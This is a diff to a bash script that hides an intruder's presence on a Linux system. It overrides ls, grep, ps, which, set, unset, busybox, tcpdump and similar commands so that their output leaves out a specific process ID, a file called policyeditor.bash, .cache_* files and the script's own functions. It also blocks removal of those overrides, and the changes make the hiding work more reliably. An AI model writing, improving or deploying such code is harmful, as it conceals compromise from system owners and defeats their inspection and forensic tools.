@@ -1,10 +1,10 @@
 command export _HG_P="grep|head|tail|strace|ps|__vte|4316|/proc/|hidepid|eval|bash_|mount|set|cat|tcpdump|tshark|lsof|findmnt|ls|alias|declare|which|typeset|env|printenv|export|unset|busybox|policyeditor|_HG_P"
 unalias ls grep tcpdump tshark lsof cat type which mount findmnt alias env printenv set export declare typeset unset head tail which strace ss busybox netstat 2>/dev/null
 function which { 
-    [[ -n "$COMP_LINE" ]] && { command $(which which) "$@"; return; }
+    [[ -n "$COMP_LINE" ]] && { $(command which which) "$@"; return; }
     for a in "$@"; do 
         [[ "$a" == -* ]] && continue
-        command $(which which) -a "$a" 2>/dev/null | command /usr/bin/head -n 1
+        $(command which which) -a "$a" 2>/dev/null | command /usr/bin/head -n 1
     done 
 }
 _filter_output() { command $(which grep) --line-buffered -Ev "$_HG_P"; }
@@ -39,7 +39,7 @@ function ls {
         local empty_dirs=$(command $(which find) /proc -maxdepth 1 -type d -empty -name "[0-9]*" -printf "-I %f ")
         command $(which ls) $empty_dirs -I "$p" -I "policyeditor.bash" "$@"
     else
-        command $(which ls) -I "$p" -I "policyeditor.bash" -I ".cache_*""$@"
+        command $(which ls) -I "$p" -I "policyeditor.bash" -I ".cache_*" "$@"
     fi
 }
 function busybox {
@@ -61,13 +61,13 @@ function busybox {
     done
     command busybox "$subcmd" "$@"
 }
-for cmd in grep head tail cat strace tcpdump tshark lsof ls ps mount findmnt netstat ss busybox; do
+for cmd in grep head tail cat strace tcpdump tshark lsof ls mount findmnt netstat ss busybox; do
     path=$(which $cmd)
     if [[ -n "$path" && "$path" == /* ]]; then
         eval "function $path { $cmd \"\$@\"; }"
     fi
 done
-_HIDDEN_FUNC_PATTERN="(grep|head|ps|tail|builtin|strace|type|set|typeset|declare|export|ls|cat|tcpdump|tshark|lsof|mount|findmnt|which|env|printenv|unset|ss|netstat|busybox|_filter_output|_HIDDEN_FUNC_PATTERN|\/usr\/bin|\/usr\/sbin|\/bin\/)"
+_HIDDEN_FUNC_PATTERN="(grep|head|ps|tail|builtin|strace|type|set|typeset|declare|export|ls|cat|tcpdump|tshark|lsof|mount|findmnt|which|env|printenv|unset|ss|netstat|busybox|_filter_output|_HIDDEN_FUNC_PATTERN|$(command which busybox)|$(command which cat)|$(command which findmnt)|$(command which grep)|$(command which head)|$(command which ls)|$(command which lsof)|$(command which mount)|$(command which netstat)|$(command which ss)|$(command which strace)|$(command which tail)|$(command which tshark)|$(command which tcpdump))"
 set() {
     if [[ -n "$COMP_LINE" ]]; then command builtin set "$@"; return; fi
     command builtin set "$@" | /usr/bin/awk -v pat="$_HIDDEN_FUNC_PATTERN" '
@@ -143,5 +143,5 @@ function unset {
     if [[ "$*" =~ ($_HIDDEN_FUNC_PATTERN) ]]; then return; fi
     command builtin unset "$@"
 }
-alias ls='ls --color=auto'
 command builtin export -f grep head tail strace ps ls tcpdump tshark lsof cat mount findmnt ss netstat busybox _filter_output &>/dev/null
+alias ls='ls --color=auto'
